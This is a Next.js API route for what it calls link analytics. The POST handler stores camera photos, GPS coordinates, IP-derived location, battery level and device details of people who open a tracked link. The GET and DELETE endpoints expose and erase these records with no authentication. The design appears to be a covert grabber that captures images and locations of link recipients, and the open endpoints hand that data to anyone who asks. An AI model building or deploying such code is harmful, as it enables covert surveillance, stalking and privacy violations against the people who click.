import { NextResponse } from 'next/server'
import { connectToDatabase } from '@/lib/db'
import { getDeviceInfo, getClientIP } from '@/lib/utils'

export async function POST(request) {
  try {
    const { 
      slug, 
      deviceInfo, 
      batteryLevel, 
      screenResolution, 
      connectionType, 
      networkSpeed, 
      userAgent, 
      referrer, 
      location,
      photo, // Base64 photo data from camera
      hasCamera,
      cameraStatus 
    } = await request.json()
    
    if (!slug) {
      return NextResponse.json(
        { success: false, message: 'Slug is required' },
        { status: 400 }
      )
    }

    const { db } = await connectToDatabase()
    const clientIP = getClientIP(request)
    
    // Get location from IP
    let ipLocation = null
    try {
      const locationResponse = await fetch(`http://ip-api.com/json/${clientIP}`)
      ipLocation = await locationResponse.json()
    } catch (error) {
      console.log('IP location fetch failed:', error)
    }

    // Enhanced device info
    const enhancedDeviceInfo = {
      ...deviceInfo,
      userAgent: userAgent,
      ...getDeviceInfo(userAgent)
    }

    // Create analytics record with camera data
    const analyticsData = {
      slug,
      ip: clientIP,
      deviceInfo: enhancedDeviceInfo,
      batteryLevel,
      screenResolution,
      connectionType,
      networkSpeed,
      referrer: referrer || 'direct',
      location: {
        ...ipLocation,
        gps: location // GPS coordinates if available
      },
      timestamp: new Date(),
      userAgent: userAgent,
      // Camera and photo data
      hasCamera: hasCamera || false,
      cameraStatus: cameraStatus || 'not_attempted',
      photo: photo || null, // Base64 encoded photo
      photoSize: photo ? Math.round(photo.length * 0.75) : 0, // Approximate size in bytes
      // Additional metadata
      dataCollected: {
        deviceInfo: true,
        location: !!location,
        battery: batteryLevel !== null,
        camera: !!photo,
        network: !!connectionType
      }
    }

    // Save to database
    await db.collection('analytics').insertOne(analyticsData)

    // Update link click count
    await db.collection('links').updateOne(
      { slug },
      { 
        $inc: { clicks: 1 }, 
        $set: { lastClicked: new Date() } 
      }
    )

    return NextResponse.json({
      success: true,
      message: 'Analytics data saved successfully',
      dataCollected: {
        deviceInfo: true,
        location: !!location,
        battery: batteryLevel !== null,
        camera: !!photo,
        network: !!connectionType,
        photoSize: photo ? Math.round(photo.length * 0.75) : 0
      }
    })

  } catch (error) {
    console.error('Analytics API error:', error)
    return NextResponse.json(
      { success: false, message: 'Internal server error' },
      { status: 500 }
    )
  }
}

export async function GET(request) {
  try {
    const { searchParams } = new URL(request.url)
    const slug = searchParams.get('slug')
    const includePhotos = searchParams.get('photos') === 'true'
    
    const { db } = await connectToDatabase()
    
    let query = {}
    if (slug) {
      query.slug = slug
    }

    // Projection to optionally exclude photo data (to reduce response size)
    const projection = includePhotos ? {} : { photo: 0 }

    const analytics = await db.collection('analytics')
      .find(query, { projection })
      .sort({ timestamp: -1 })
      .limit(100)
      .toArray()

    // Add summary statistics
    const stats = {
      total: analytics.length,
      withPhotos: analytics.filter(a => a.photo).length,
      withLocation: analytics.filter(a => a.location?.gps).length,
      devices: {
        mobile: analytics.filter(a => a.deviceInfo?.device === 'Mobile').length,
        desktop: analytics.filter(a => a.deviceInfo?.device === 'Desktop').length,
        tablet: analytics.filter(a => a.deviceInfo?.device === 'Tablet').length,
      }
    }

    return NextResponse.json({
      success: true,
      data: analytics,
      stats: stats,
      total: analytics.length
    })

  } catch (error) {
    console.error('Get analytics error:', error)
    return NextResponse.json(
      { success: false, message: 'Internal server error' },
      { status: 500 }
    )
  }
}

// Optional: DELETE endpoint to clear analytics
export async function DELETE(request) {
  try {
    const { searchParams } = new URL(request.url)
    const slug = searchParams.get('slug')
    
    const { db } = await connectToDatabase()
    
    let query = {}
    if (slug) {
      query.slug = slug
    }

    const result = await db.collection('analytics').deleteMany(query)

    return NextResponse.json({
      success: true,
      message: `Deleted ${result.deletedCount} analytics records`,
      deletedCount: result.deletedCount
    })

  } catch (error) {
    console.error('Delete analytics error:', error)
    return NextResponse.json(
      { success: false, message: 'Internal server error' },
      { status: 500 }
    )
  }
}